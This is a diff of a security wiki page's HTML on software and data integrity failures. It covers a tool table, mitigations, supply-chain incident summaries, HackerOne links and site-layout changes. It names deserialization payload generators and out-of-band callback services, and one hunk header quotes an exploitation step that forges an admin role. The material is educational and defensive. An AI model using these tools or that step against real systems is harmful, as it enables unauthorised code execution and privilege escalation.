+	</thead>
+	<tbody>
+			<tr>
+					<td>ysoserial</td>
+					<td>Java deserialization gadget chain payload generator</td>
+			</tr>
+			<tr>
+					<td>PHPGGC</td>
+					<td>PHP gadget chain generator for common frameworks</td>
+			</tr>
+			<tr>
+					<td>Burp Java Deserialization Scanner</td>
+					<td>Passive/active detection of Java serialization in HTTP traffic</td>
+			</tr>
+			<tr>
+					<td>Retire.js</td>
+					<td>Detect vulnerable/outdated JS libraries loaded from CDN</td>
+			</tr>
+			<tr>
+					<td>OWASP Dependency-Check</td>
+					<td>SCA — scan project dependencies for known CVEs</td>
+			</tr>
+			<tr>
+					<td>pip-audit / npm audit</td>
+					<td>Audit Python / Node.js dependencies for known vulnerabilities</td>
+			</tr>
+			<tr>
+					<td>Trivy</td>
+					<td>Container and filesystem vulnerability scanning including dependencies</td>
+			</tr>
+			<tr>
+					<td>interactsh / Burp Collaborator</td>
+					<td>Out-of-band callback for blind deserialization confirmation</td>
+			</tr>
+			<tr>
+					<td>gospider</td>
+					<td>Crawl and extract external resource URLs for SRI audit</td>
+			</tr>
+	</tbody>
 </table>
-<h2 id="mitigation--prevention">
-  Mitigation &amp; Prevention
-  <a class="anchor" href="#mitigation--prevention">#</a>
-</h2>
+<h2 id="mitigation--prevention">Mitigation &amp; Prevention<a class="anchor" href="#mitigation--prevention">#</a></h2>
 <ol>
 <li><strong>Verify Serialized Data Integrity</strong> — HMAC-sign serialized objects before sending to clients; verify the signature before deserializing — reject anything that fails</li>
 <li><strong>Use Safe Serialization Formats</strong> — Replace <code>pickle</code>, <code>unserialize()</code>, <code>ObjectInputStream</code> with JSON or other data-only formats that cannot execute code</li>
@@ -1739,14 +1656,8 @@ Re-encode to Base64 and submit — application grants admin role
 <li><strong>Sign and Verify Updates</strong> — All software updates must be signed; clients verify signature before installation — reject unsigned or signature-invalid updates</li>
 <li><strong>SBOM in CI/CD</strong> — Generate a Software Bill of Materials (SBOM) per build using CycloneDX or SPDX; alert on new or changed dependencies</li>
 </ol>
-<h2 id="good-to-read">
-  Good To Read
-  <a class="anchor" href="#good-to-read">#</a>
-</h2>
-<h3 id="notable-incidents">
-  Notable Incidents
-  <a class="anchor" href="#notable-incidents">#</a>
-</h3>
+<h2 id="good-to-read">Good To Read<a class="anchor" href="#good-to-read">#</a></h2>
+<h3 id="notable-incidents">Notable Incidents<a class="anchor" href="#notable-incidents">#</a></h3>
 <ul>
 <li><strong>SolarWinds Orion (2020):</strong> Attackers injected <code>SUNBURST</code> malware into the build pipeline — legitimate signed updates distributed to 18,000+ organizations including US government agencies</li>
 <li><strong>Polyfill.io (2024):</strong> Domain sold to Funnull (China); malicious JS injected into 380,000+ sites embedding <code>cdn.polyfill.io</code> without SRI — redirected mobile users to scam sites (CVE-2024-38526)</li>
@@ -1755,20 +1666,14 @@ Re-encode to Base64 and submit — application grants admin role
 <li><strong>3CX (2023):</strong> Cascading supply chain attack — compromised Trading Technologies software infected a 3CX developer&rsquo;s machine, which then poisoned the 3CX desktop app build</li>
 <li><strong>XZ Utils (2024):</strong> Two-year social engineering campaign added a backdoor to <code>liblzma</code> (CVE-2024-3094) — would have enabled SSH RCE on affected Linux distributions</li>
 </ul>
-<h3 id="hackerone-reports">
-  HackerOne Reports
-  <a class="anchor" href="#hackerone-reports">#</a>
-</h3>
+<h3 id="hackerone-reports">HackerOne Reports<a class="anchor" href="#hackerone-reports">#</a></h3>
 <ul>
 <li><a href="https://hackerone.com/reports/1659202" target="_blank" rel="noreferrer noopener nofollow">Remote Code Execution via Java Deserialization (#1659202)</a><img src="/svg/icons8-external-link.svg" style="height: 15px;"></li>
 <li><a href="https://hackerone.com/reports/838196" target="_blank" rel="noreferrer noopener nofollow">Insecure Deserialization leading to RCE (#838196)</a><img src="/svg/icons8-external-link.svg" style="height: 15px;"></li>
 <li><a href="https://hackerone.com/reports/1504659" target="_blank" rel="noreferrer noopener nofollow">Dependency Confusion — Internal Package Hijack (#1504659)</a><img src="/svg/icons8-external-link.svg" style="height: 15px;"></li>
 <li><a href="https://hackerone.com/reports/1161427" target="_blank" rel="noreferrer noopener nofollow">Unsafe Deserialization in Ruby on Rails (#1161427)</a><img src="/svg/icons8-external-link.svg" style="height: 15px;"></li>
 </ul>
-<h2 id="references">
-  References
-  <a class="anchor" href="#references">#</a>
-</h2>
+<h2 id="references">References<a class="anchor" href="#references">#</a></h2>
 <ul>
 <li><a href="https://owasp.org/Top10/2021/A08_2021-Software_and_Data_Integrity_Failures/" target="_blank" rel="noreferrer noopener nofollow">OWASP Top 10 A08:2021 — Software and Data Integrity Failures</a><img src="/svg/icons8-external-link.svg" style="height: 15px;"></li>
 <li><a href="https://owasp.org/Top10/2025/A08_2025-Software_or_Data_Integrity_Failures/" target="_blank" rel="noreferrer noopener nofollow">OWASP Top 10 A08:2025 — Software or Data Integrity Failures</a><img src="/svg/icons8-external-link.svg" style="height: 15px;"></li>
@@ -1789,49 +1694,62 @@ Re-encode to Base64 and submit — application grants admin role
         
   <div class="flex flex-wrap justify-between">
 
-
-  <div><a class="flex align-center" href="https://github.com/payatu/cybersec-wiki/commit/d2c880c4a57b9b433287f413f6e6111ca829ffdd" title='Last modified by banditSaurabh | August 5, 2026' target="_blank" rel="noopener">
-      <img src="/svg/calendar.svg" class="book-icon" alt="Calendar" />
-      <span>August 5, 2026</span>
-    </a>
-  </div>
-
-
-
-  <div>
-    <a class="flex align-center" href="https://github.com/payatu/cybersec-wiki/edit/main/content/docs/application-security/web/Software%20&amp;%20Data%20Integrity%20Failures.md" target="_blank" rel="noopener">
-      <img src="/svg/edit.svg" class="book-icon" alt="Edit" />
-      <span>Edit this page</span>
-    </a>
-  </div>
-
+<div>
 
 </div>
 
+<div>
 
+</div>
 
-  <script>(function(){function e(e){const t=window.getSelection(),n=document.createRange();n.selectNodeContents(e),t.removeAllRanges(),t.addRange(n)}document.querySelectorAll("pre code").forEach(t=>{t.addEventListener("click",function(){e(t.parentElement),navigator.clipboard&&navigator.clipboard.writeText(t.parentElement.textContent)})})})()</script>
+</div>
 
+<div class="flex flex-wrap justify-between">
+    <span>
+    
+      <a href="/docs/application-security/web/Session-Management-Weaknesses/" class="flex align-center">
+        <img src="/icons/backward.svg" class="book-icon" alt="Backward" />
+        <span>Session Management Weaknesses</span>
+      </a>
+    
+    </span>
+    <span>
+    
+      <a href="/docs/application-security/web/Subdomain-Takeover/" class="flex align-center">
+        <span>Subdomain Takeover</span>
+        <img src="/icons/forward.svg" class="book-icon" alt="Forward" />
+      </a>
+    
+    </span>
+  </div>
 
  
         
-      </footer>
-
-      
   
   <div class="book-comments">
 
 </div>
   
  
+        
+        
+  
+ 
+        
+  
+    <script>(function(){document.querySelectorAll("pre:has(code)").forEach(e=>{e.addEventListener("click",e.focus),e.addEventListener("copy",function(t){if(t.preventDefault(),navigator.clipboard){const t=window.getSelection().toString()||e.textContent;navigator.clipboard.writeText(t)}})})})()</script>
+  
+
+      </footer>
 
       <label for="menu-control" class="hidden book-menu-overlay"></label>
     </div>
 
     
-    <aside class="book-toc">
-      <div class="book-toc-content">
-        
+  
+  <aside class="book-toc">
+    <div class="book-toc-content">
+      
   
 <nav id="TableOfContents">
   <ul>
@@ -1879,15 +1797,24 @@ Re-encode to Base64 and submit — application grants admin role
 </nav>
 
 
+
+    </div>
+  </aside>
+  
  
-      </div>
-    </aside>
-    
   </main>
 
   
 </body>
 </html>
+
+
+
+
+
+
+
+
 
 
 
